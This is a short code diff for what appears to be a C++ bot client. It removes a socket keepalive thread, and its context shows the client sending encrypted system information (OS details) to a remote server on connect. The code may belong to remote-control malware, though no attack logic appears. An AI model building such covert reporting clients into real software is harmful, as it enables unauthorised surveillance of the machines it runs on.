@@ -36,11 +36,6 @@ void on_client_rec_data(char* data)
     current_bot.on_client_rec_data(data);
 }
 
-DWORD WINAPI t_ping(LPVOID lpParams)
-{
-    return current_bot.ping(lpParams);
-}
-
 void main(cli::array<System::String ^> ^ args)
 {
     if (args->Length < 2) {
@@ -235,22 +230,4 @@ void ABot::on_client_connect()
     sys_data["OS"] = os_output;
 
     client.send_data(encryptCMD(sys_data.dump()).c_str());
-
-    CreateThread(0, 0, t_ping, 0, 0, 0);
-}
-
-DWORD ABot::ping(LPVOID lpParams)
-{
-    while (1) {
-        Sleep(3000);
-        char buf;
-        int err = recv(client.Socket_Client, &buf, 1, MSG_PEEK);
-        if (err == SOCKET_ERROR) {
-            if (WSAGetLastError() != WSAEWOULDBLOCK) {
-                client.close();
-                break;
-            }
-        }
-    }
-    return 0;
 }
